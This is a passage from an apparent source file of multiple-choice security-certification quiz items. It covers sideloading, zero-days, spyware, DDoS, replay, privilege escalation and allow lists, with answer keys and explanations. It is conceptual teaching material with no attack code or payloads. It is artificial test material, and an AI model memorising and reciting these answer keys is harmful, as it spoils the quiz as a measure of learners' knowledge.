    id: "sis-mobile-sideloading-1",
    conceptIds: ["mobile-sideloading"],
    difficulty: "intermediate",
    scenario:
      "An employee installs a modified game on a company phone by downloading an APK file from a website, after changing a setting to allow unknown sources.",
    stem: "What is this practice called?",
    options: ["Jailbreaking", "Sideloading", "Bluesnarfing", "Tethering"],
    correct: ["b"],
    explanation: "Installing apps from outside the official app store is sideloading.",
    why: {
      a: "Jailbreaking removes the OS restrictions themselves; this used a setting to install an outside app.",
      c: "Bluesnarfing steals data over Bluetooth.",
      d: "Tethering shares the phone's internet connection.",
    },
  }),
  q({
    id: "sis-mobile-sideloading-2",
    conceptIds: ["mobile-sideloading"],
    difficulty: "exam",
    stem: "Why do organizations commonly block jailbroken or rooted phones from accessing corporate email?",
    options: [
      "Jailbroken phones cannot use encryption at all",
      "Jailbreaking always installs ransomware",
      "Jailbreaking voids the phone's warranty",
      "Jailbreaking removes OS security restrictions, so apps can bypass sandboxing and MDM controls",
    ],
    correct: ["d"],
    explanation:
      "Removing the built-in restrictions means malicious apps can reach other apps' data, and the organization can't trust its controls on that device.",
    why: {
      a: "Encryption may still work; the problem is that the OS security model can't be trusted.",
      b: "Jailbreaking raises risk but doesn't automatically install any malware.",
      c: "Warranty is a support concern, not the security reason for blocking access.",
    },
  }),

  // ---------- Zero-day ----------
  q({
    id: "sis-zero-day-1",
    conceptIds: ["zero-day"],
    difficulty: "intermediate",
    stem: "Which statement BEST defines a zero-day vulnerability?",
    options: [
      "A flaw that was patched on the first day of the month",
      "A vulnerability attackers can exploit before the vendor has released a fix",
      "Any vulnerability rated critical by CVSS",
      "A flaw that can only be exploited on the day it is found",
    ],
    correct: ["b"],
    explanation: "Zero-day means defenders have had zero days to patch: the flaw is known to attackers but no fix exists yet.",
    why: {
      a: "A patched flaw is no longer a zero-day.",
      c: "Severity scores and zero-day status are separate ideas.",
      d: "A zero-day can be exploited for as long as it stays unpatched.",
    },
  }),
  q({
    id: "sis-zero-day-2",
    conceptIds: ["zero-day"],
    difficulty: "exam",
    stem: "Signature-based antivirus is often ineffective against zero-day exploits. Which approach is MOST likely to detect one?",
    options: [
      "Behavior-based detection that flags abnormal activity, such as EDR",
      "Weekly signature updates",
      "Hash-based block lists of known malware",
      "Running a compliance checklist",
    ],
    correct: ["a"],
    explanation:
      "A zero-day has no known signature, so watching for suspicious behavior is what gives defenders a chance to catch it.",
    why: {
      b: "No signature exists yet for an unknown exploit, however often signatures update.",
      c: "Hash lists only match malware that has already been seen.",
      d: "Compliance checks confirm settings; they don't detect active exploitation.",
    },
  }),

  // ---------- Spyware ----------
  q({
    id: "sis-spyware-1",
    conceptIds: ["spyware"],
    difficulty: "intermediate",
    scenario:
      "A forensic review finds software on an executive's laptop that takes a screenshot every few minutes, records browsing history, and sends both to an external server. It doesn't encrypt or delete anything.",
    stem: "Which malware type BEST matches this behavior?",
    options: ["Ransomware", "Worm", "Spyware", "Logic bomb"],
    correct: ["c"],
    explanation: "Software that secretly watches the user and sends what it sees to an attacker is spyware.",
    why: {
      a: "Ransomware encrypts data for payment; nothing was encrypted.",
      b: "A worm is defined by self-spreading, not monitoring.",
      d: "A logic bomb waits for a trigger to do damage.",
    },
  }),
  q({
    id: "sis-spyware-2",
    conceptIds: ["spyware"],
    difficulty: "exam",
    stem: "Which network indicator would MOST likely reveal spyware on a workstation?",
    options: [
      "Regular small uploads to an unfamiliar external host at fixed intervals",
      "A sudden rename of every file on a share",
      "A spike in failed logins against many accounts",
      "Thousands of ICMP packets aimed at the web server",
    ],
    correct: ["a"],
    explanation:
      "Spyware collects data and sends it out regularly, so periodic uploads to an unknown destination are a strong sign.",
    why: {
      b: "Mass file renaming points to ransomware.",
      c: "Failed logins across many accounts suggest password spraying.",
      d: "A flood of ICMP traffic suggests a denial-of-service attempt.",
    },
  }),

  // ---------- Virus ----------
  q({
    id: "sis-virus-1",
    conceptIds: ["virus", "worm"],
    difficulty: "intermediate",
    stem: "What is the key difference between a virus and a worm?",
    options: [
      "A virus is always more damaging than a worm",
      "A worm needs a host file, while a virus does not",
      "A virus needs a host file and user action to spread, while a worm spreads across the network on its own",
      "Only viruses can carry a payload",
    ],
    correct: ["c"],
    explanation: "A virus rides inside files and spreads when people run or share them. A worm replicates by itself.",
    why: {
      a: "Damage depends on the payload, not the type.",
      b: "This reverses the two; the virus is the one that needs a host.",
      d: "Worms often carry payloads too, such as ransomware.",
    },
  }),
  q({
    id: "sis-virus-2",
    conceptIds: ["virus"],
    difficulty: "exam",
    scenario:
      "Every Word document a user opens becomes infected, and colleagues who open documents the user shared are infected too. The code runs when the document's macros run.",
    stem: "Which control would BEST stop this from spreading?",
    options: [
      "Block macros in documents from the internet and allow only signed macros",
      "Enable DNSSEC",
      "Increase password complexity",
      "Deploy a wireless intrusion prevention system",
    ],
    correct: ["a"],
    explanation: "This is a macro virus. Blocking untrusted macros prevents its code from running when files are opened.",
    why: {
      b: "DNSSEC protects DNS records, not documents.",
      c: "The virus spreads through file sharing, not stolen passwords.",
      d: "A WIPS detects rogue wireless devices, not infected documents.",
    },
  }),

  // ---------- Physical attacks ----------
  q({
    id: "sis-physical-attacks-1",
    conceptIds: ["physical-attacks"],
    difficulty: "intermediate",
    scenario:
      "Customers at a gas station report fraudulent charges. A technician finds an extra device fitted over the pump's card slot that reads cards as they are inserted.",
    stem: "Which physical attack is this?",
    options: ["Tailgating", "Card skimming", "Shoulder surfing", "Dumpster diving"],
    correct: ["b"],
    explanation: "A hidden reader on a card slot that copies card data is a skimmer.",
    why: {
      a: "Tailgating means following someone through a secure door.",
      c: "Shoulder surfing is watching someone enter information.",
      d: "Dumpster diving searches discarded material for information.",
    },
  }),

  // ---------- DDoS ----------
  q({
    id: "sis-ddos-1",
    conceptIds: ["ddos"],
    difficulty: "exam",
    stem: "An online retailer expects a large DDoS attack during its holiday sale. Which control BEST maintains availability?",
    options: [
      "A cloud-based DDoS scrubbing service in front of the site",
      "A stronger admin password",
      "Full-disk encryption on the web servers",
      "Disabling logging to save bandwidth",
    ],
    correct: ["a"],
    explanation: "A scrubbing service absorbs and filters huge traffic volumes before they reach the retailer's own connection.",
    why: {
      b: "DDoS floods traffic; it doesn't need to log in.",
      c: "Encryption protects stored data, not availability under flood.",
      d: "Disabling logging removes visibility and won't stop the flood.",
    },
  }),
  q({
    id: "sis-ddos-2",
    conceptIds: ["ddos"],
    difficulty: "intermediate",
    scenario:
      "A web server's connection table fills with half-open TCP sessions from tens of thousands of IP addresses around the world. Legitimate customers can't connect.",
    stem: "What BEST describes this attack?",
    options: [
      "A DoS attack from one host",
      "A replay attack",
      "A distributed SYN flood",
      "An on-path attack",
    ],
    correct: ["c"],
    explanation: "Many sources leaving half-open connections to exhaust the server is a distributed SYN flood, a form of DDoS.",
    why: {
      a: "The traffic comes from tens of thousands of addresses, so it is distributed.",
      b: "A replay resends captured valid messages to gain access, not to exhaust resources.",
      d: "An on-path attacker intercepts traffic rather than flooding a target.",
    },
  }),

  // ---------- Wireless attacks ----------
  q({
    id: "sis-wireless-attacks-1",
    conceptIds: ["wireless-attacks"],
    difficulty: "exam",
    scenario:
      "A wireless survey finds an access point plugged into a network jack in a meeting room. It isn't in the asset inventory and broadcasts an open SSID.",
    stem: "What has the survey found?",
    options: ["An evil twin", "A rogue access point", "A deauthentication attack", "Bluejacking"],
    correct: ["b"],
    explanation: "An unauthorized access point connected to the corporate network is a rogue AP.",
    why: {
      a: "An evil twin copies a legitimate network's name to lure users; this AP uses its own SSID.",
      c: "Deauthentication is a frame-based attack that kicks clients off, not a device in a jack.",
      d: "Bluejacking is sending unwanted Bluetooth messages.",
    },
  }),
  q({
    id: "sis-wireless-attacks-2",
    conceptIds: ["wireless-attacks"],
    difficulty: "intermediate",
    scenario:
      "A wireless IDS sees a burst of deauthentication frames that disconnects every laptop in the office. Right after, a new AP with the same SSID appears with a stronger signal.",
    stem: "What is the attacker MOST likely trying to do?",
    options: [
      "Force users to reconnect to an evil twin so their traffic passes through the attacker",
      "Crack the RADIUS server's certificate",
      "Perform a SQL injection",
      "Launch a watering-hole attack",
    ],
    correct: ["a"],
    explanation: "Deauthentication knocks clients off so they rejoin the stronger fake network, putting the attacker in the middle.",
    why: {
      b: "Deauth frames don't break certificates.",
      c: "SQL injection targets database-backed applications, not Wi-Fi.",
      d: "A watering-hole attack compromises a website the victims visit.",
    },
  }),

  // ---------- Replay attack ----------
  q({
    id: "sis-replay-attack-1",
    conceptIds: ["replay-attack"],
    difficulty: "intermediate",
    scenario:
      "A garage door opener sends the same fixed code every time. A neighbor records the signal with a radio and later uses it to open the door.",
    stem: "Which attack is this?",
    options: ["Brute force", "Replay attack", "Jamming", "Downgrade attack"],
    correct: ["b"],
    explanation: "Capturing a valid signal and sending it again later to repeat its effect is a replay attack.",
    why: {
      a: "Brute force guesses many codes; this reused one captured code.",
      c: "Jamming blocks signals rather than reusing them.",
      d: "A downgrade attack forces a weaker protocol version.",
    },
  }),
  q({
    id: "sis-replay-attack-2",
    conceptIds: ["replay-attack"],
    difficulty: "exam",
    stem: "Which situation is an example of a replay attack?",
    options: [
      "An attacker tries thousands of passwords against a payment API's admin account",
      "An attacker sits between a client and a payment API and changes the amount in each request as it passes",
      "An attacker forces the payment API's connection to negotiate an older, weaker TLS version",
      "An attacker records one valid, signed 'pay $500' request to a payment API and submits the identical request five more times",
    ],
    correct: ["d"],
    explanation:
      "Re-sending a captured, valid message unchanged so it takes effect again is a replay. A nonce or timestamp in each request lets the server reject repeats.",
    why: {
      a: "Guessing many passwords is brute force.",
      b: "Intercepting and altering traffic in real time is an on-path attack; a replay sends the message again without changing it.",
      c: "Forcing an older protocol version is a downgrade attack.",
    },
  }),

  // ---------- Crypto attacks ----------
  q({
    id: "sis-crypto-attacks-1",
    conceptIds: ["crypto-attacks"],
    difficulty: "exam",
    stem: "Which configuration BEST prevents downgrade attacks against a web server?",
    options: [
      "Allow every protocol version for compatibility",
      "Use a longer domain name",
      "Increase the server's session timeout",
      "Disable old protocol versions and weak cipher suites so they can't be negotiated",
    ],
    correct: ["d"],
    explanation: "If weak versions aren't offered, an attacker can't force the connection down to them.",
    why: {
      a: "Allowing every version is exactly what makes a downgrade possible.",
      b: "Domain name length has nothing to do with protocol negotiation.",
      c: "Session timeouts don't affect which protocol is negotiated.",
    },
  }),
  q({
    id: "sis-crypto-attacks-2",
    conceptIds: ["crypto-attacks"],
    difficulty: "advanced",
    stem: "Why are hash algorithms with short outputs more vulnerable to birthday attacks?",
    options: [
      "Short hashes can be reversed to recover the original input",
      "Finding any two inputs with the same hash takes only about the square root of the number of possible outputs",
      "Short hashes need a key that attackers can steal",
      "Birthday attacks only work on encrypted traffic",
    ],
    correct: ["b"],
    explanation:
      "The birthday paradox means collisions appear far sooner than expected, so a short hash gives too few outputs to resist them.",
    why: {
      a: "Hashes are one-way; the attack finds collisions, not original inputs.",
      c: "Plain hash functions don't use a key.",
      d: "Birthday attacks target hash functions, such as those used in signatures, not encrypted traffic.",
    },
  }),

  // ---------- Privilege escalation ----------
  q({
    id: "sis-privilege-escalation-1",
    conceptIds: ["privilege-escalation"],
    difficulty: "intermediate",
    scenario:
      "In a web app, a regular user changes the account number in a request and is able to read and edit another regular user's messages. Their own role doesn't change.",
    stem: "Which type of privilege escalation is this?",
    options: [
      "Vertical privilege escalation",
      "Pass-the-hash",
      "Horizontal privilege escalation",
      "Kerberoasting",
    ],
    correct: ["c"],
    explanation: "Gaining access to another user at the same privilege level is horizontal escalation.",
    why: {
      a: "Vertical escalation moves to a higher privilege level, such as admin.",
      b: "Pass-the-hash reuses a stolen password hash to authenticate.",
      d: "Kerberoasting cracks service account tickets offline.",
    },
  }),
  q({
    id: "sis-privilege-escalation-2",
    conceptIds: ["privilege-escalation"],
    difficulty: "exam",
    stem: "Which control BEST limits the damage if an attacker achieves privilege escalation on a server?",
    options: [
      "Running services with least privilege instead of as SYSTEM or root",
      "Using a longer screen-saver timeout",
      "Allowing all users local admin rights",
      "Disabling audit logging",
    ],
    correct: ["a"],
    explanation: "When services run with only the rights they need, exploiting them gives the attacker far less power.",
    why: {
      b: "Screen-saver timing doesn't limit privileges.",
      c: "Giving everyone admin rights removes the need to escalate at all.",
      d: "Disabling logging hides the attack instead of limiting it.",
    },
  }),

  // ---------- Brute force ----------
  q({
    id: "sis-brute-force-1",
    conceptIds: ["brute-force"],
    difficulty: "intermediate",
    scenario:
      "Authentication logs show 14,000 failed logins against the single account 'jsmith' from one IP address in an hour, each with a different password.",
    stem: "Which control would MOST directly stop this attack?",
    options: [
      "Account lockout or progressive delays after repeated failures",
      "Disabling TLS on the login page",
      "Encrypting the user's home directory",
      "Increasing the session timeout",
    ],
    correct: ["a"],
    explanation: "This is brute force against one account. Lockouts or delays make thousands of guesses impractical.",
    why: {
      b: "Disabling TLS weakens security and does nothing to stop guessing.",
      c: "Home directory encryption doesn't limit login attempts.",
      d: "Session timeouts affect logged-in users, not failed guesses.",
    },
  }),

  // ---------- IOC ----------
  q({
    id: "sis-ioc-indicators-1",
    conceptIds: ["ioc-indicators"],
    difficulty: "intermediate",
    scenario:
      "A user who works only in Denver shows a successful login from Denver at 9:00 a.m. and another from Tokyo at 9:25 a.m. the same day.",
    stem: "Which indicator of compromise is this?",
    options: ["Resource consumption", "Blocked content", "Impossible travel", "Out-of-cycle logging"],
    correct: ["c"],
    explanation: "No one can travel from Denver to Tokyo in 25 minutes, so the second login likely uses stolen credentials.",
    why: {
      a: "Resource consumption is unusual CPU, memory or bandwidth use.",
      b: "Blocked content is a security tool stopping access to something.",
      d: "Out-of-cycle logging is logs appearing or missing at odd times.",
    },
  }),

  // ---------- Application allow list ----------
  q({
    id: "sis-application-allow-list-1",
    conceptIds: ["application-allow-list"],
    difficulty: "intermediate",
    stem: "How does an application allow list differ from an application block list?",
    options: [
      "An allow list blocks only known malware, while a block list blocks everything else",
      "An allow list permits only approved programs and denies everything else by default",
      "They are the same control with different names",
      "An allow list only works on mobile devices",
    ],
    correct: ["b"],
    explanation: "An allow list is default-deny: anything not approved won't run, including new, unknown malware.",
    why: {
      a: "That describes a block list, which stops only items it already knows about.",
      c: "They work in opposite ways: default-deny versus default-allow.",
      d: "Allow listing is widely used on servers, kiosks and workstations.",
    },
  }),
  q({
    id: "sis-application-allow-list-2",
    conceptIds: ["application-allow-list"],
    difficulty: "exam",
    scenario:
      "A company deploys application allow listing on all workstations. The next week, developers complain that a newly released version of their compiler won't start.",
    stem: "What is the MOST likely reason?",
    options: [
      "The compiler contains malware",
      "The workstation firewall is blocking the compiler",
      "The new version isn't on the approved list yet, so it is denied by default",
      "The developers' passwords expired",
    ],
    correct: ["c"],
    explanation:
      "Allow lists block anything not explicitly approved, so new software versions need to be added. This administrative overhead is the main trade-off of the control.",
    why: {
      a: "Nothing suggests malware; legitimate unapproved software is blocked too.",
      b: "A firewall controls network traffic, not whether a program can start.",
      d: "Expired passwords would stop login, not one specific program.",
    },
  }),
];
